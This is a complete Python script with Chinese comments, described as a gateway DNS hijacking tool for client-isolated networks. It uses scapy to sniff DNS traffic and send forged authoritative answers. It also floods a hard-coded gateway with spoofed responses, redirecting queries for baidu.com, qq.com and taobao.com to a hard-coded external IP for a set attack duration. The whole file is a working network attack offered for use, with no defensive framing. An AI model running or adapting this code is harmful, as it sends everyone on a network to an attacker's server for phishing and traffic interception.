#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
网关DNS劫持工具
针对客户端隔离环境的特殊解决方案
"""

import threading
import time
import socket
from scapy.all import *

class GatewayDNSHijack:
    def __init__(self):
        self.attack_running = False
        self.local_ip = socket.gethostbyname(socket.gethostname())
        
        # 配置参数
        self.config = {
            'gateway_ip': '10.30.255.254',
            'dns_server': '8.8.8.8',  # 默认DNS服务器
            'hijack_domains': 'baidu.com,qq.com,taobao.com',
            'redirect_ip': '154.12.89.37',
            'attack_duration': 600
        }
        
        self.stats = {
            'dns_queries_intercepted': 0,
            'spoofed_responses_sent': 0
        }
    
    def get_configuration(self):
        """获取配置"""
        print("=" * 70)
        print("          网关DNS劫持工具 (客户端隔离环境)")
        print("=" * 70)
        
        print("\n🔍 检测到客户端隔离环境")
        print("💡 策略: 针对网关进行DNS劫持，影响整个网络段")
        
        # 使用默认配置或允许自定义
        print("\n🌐 当前配置:")
        print(f"   网关IP: {self.config['gateway_ip']}")
        print(f"   劫持域名: {self.config['hijack_domains']}")
        print(f"   重定向到: {self.config['redirect_ip']}")
        
        # 允许用户修改
        custom = input("\n使用自定义配置? (Y/N, 默认N): ").strip().upper()
        if custom == 'Y':
            self.config['gateway_ip'] = input("网关IP: ").strip() or self.config['gateway_ip']
            self.config['hijack_domains'] = input("劫持域名: ").strip() or self.config['hijack_domains']
            self.config['redirect_ip'] = input("重定向IP: ").strip() or self.config['redirect_ip']
            
            try:
                duration = int(input("攻击时长(秒): ").strip() or "600")
                self.config['attack_duration'] = duration
            except:
                pass
        
        return self.confirm_attack()
    
    def confirm_attack(self):
        """确认攻击"""
        print("\n" + "=" * 70)
        print("          攻击确认")
        print("=" * 70)
        
        print("🎯 攻击目标: 网关DNS服务器")
        print(f"🌐 网关IP: {self.config['gateway_ip']}")
        print(f"🔗 劫持域名: {self.config['hijack_domains']}")
        print(f"🔄 重定向到: {self.config['redirect_ip']}")
        print(f"⏰ 攻击时长: {self.config['attack_duration']}秒")
        
        print("\n⚠️  注意: 此攻击将影响整个网络段的DNS解析")
        
        while True:
            confirm = input("\n确认执行网关DNS劫持? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_gateway_hijack(self):
        """开始网关DNS劫持"""
        print("\n" + "=" * 70)
        print("          网关DNS劫持开始")
        print("=" * 70)
        
        self.attack_running = True
        start_time = time.time()
        
        # 解析域名列表
        domains = [d.strip() for d in self.config['hijack_domains'].split(',')]
        
        print(f"\n📊 攻击信息:")
        print(f"   目标网关: {self.config['gateway_ip']}")
        print(f"   劫持域名: {', '.join(domains)}")
        print(f"   重定向IP: {self.config['redirect_ip']}")
        print(f"   预计时长: {self.config['attack_duration']}秒")
        
        print("\n[+] 启动DNS监听和劫持...")
        
        def dns_sniffer(packet):
            """DNS数据包嗅探器"""
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                query = packet[DNSQR].qname.decode()
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # 检查是否是目标域名的查询
                for domain in domains:
                    if domain in query:
                        self.stats['dns_queries_intercepted'] += 1
                        
                        print(f"\n📡 检测到DNS查询 #{self.stats['dns_queries_intercepted']}")
                        print(f"   域名: {query}")
                        print(f"   来源: {src_ip}")
                        print(f"   目标: {dst_ip}")
                        
                        # 创建欺骗响应
                        spoofed_response = self.create_spoofed_response(packet, self.config['redirect_ip'])
                        
                        if spoofed_response:
                            send(spoofed_response, verbose=0)
                            self.stats['spoofed_responses_sent'] += 1
                            print(f"   ✅ 发送欺骗响应到 {src_ip}")
        
        # 主动DNS攻击线程
        def active_dns_attack():
            """主动DNS攻击"""
            print("[+] 启动主动DNS攻击线程...")
            
            end_time = time.time() + self.config['attack_duration']
            
            while self.attack_running and time.time() < end_time:
                try:
                    # 向网关发送DNS欺骗包
                    for domain in domains:
                        # 构造DNS查询包
                        dns_query = IP(dst=self.config['gateway_ip']) / \
                                   UDP(sport=12345, dport=53) / \
                                   DNS(rd=1, qd=DNSQR(qname=domain))
                        
                        # 创建欺骗响应
                        spoofed_response = self.create_spoofed_response(dns_query, self.config['redirect_ip'])
                        
                        if spoofed_response:
                            send(spoofed_response, verbose=0)
                            print(f"[主动] 发送DNS欺骗包: {domain}")
                    
                    time.sleep(5)  # 每5秒发送一次
                    
                except Exception as e:
                    print(f"[主动攻击] 错误: {e}")
        
        # 启动主动攻击线程
        active_thread = threading.Thread(target=active_dns_attack)
        active_thread.daemon = True
        active_thread.start()
        
        # 开始被动嗅探
        try:
            print("[+] 开始监听DNS流量...")
            print("   监听端口: 53 (DNS)")
            print("   过滤条件: udp port 53")
            
            sniff(filter="udp port 53", prn=dns_sniffer, timeout=self.config['attack_duration'])
            
        except Exception as e:
            print(f"[-] DNS监听失败: {e}")
        finally:
            self.stop_attack(start_time)
    
    def create_spoofed_response(self, query_packet, spoofed_ip):
        """创建DNS欺骗响应包"""
        try:
            if query_packet.haslayer(DNS):
                dns_query = query_packet[DNS]
                
                dns_response = IP(dst=query_packet[IP].src, src=query_packet[IP].dst) / \
                              UDP(dport=query_packet[UDP].sport, sport=53) / \
                              DNS(id=dns_query.id,
                                  qr=1,  # 响应
                                  aa=1,  # 权威答案
                                  qd=dns_query.qd,
                                  an=DNSRR(rrname=dns_query.qd.qname,
                                          type='A',
                                          ttl=600,
                                          rdata=spoofed_ip))
                
                return dns_response
        except Exception as e:
            print(f"[-] 创建DNS响应包失败: {e}")
        
        return None
    
    def stop_attack(self, start_time):
        """停止攻击"""
        if self.attack_running:
            print("\n[+] 停止网关DNS劫持...")
            self.attack_running = False
            
            elapsed = time.time() - start_time
            
            print("\n" + "=" * 70)
            print("          攻击统计")
            print("=" * 70)
            print(f"   总运行时间: {int(elapsed)}秒")
            print(f"   DNS查询拦截数: {self.stats['dns_queries_intercepted']}")
            print(f"   欺骗响应发送数: {self.stats['spoofed_responses_sent']}")
            
            if self.stats['dns_queries_intercepted'] > 0:
                success_rate = (self.stats['spoofed_responses_sent'] / self.stats['dns_queries_intercepted']) * 100
                print(f"   成功率: {success_rate:.1f}%")
            
            print("=" * 70)

def main():
    """主函数"""
    try:
        hijack = GatewayDNSHijack()
        
        if hijack.get_configuration():
            hijack.start_gateway_hijack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()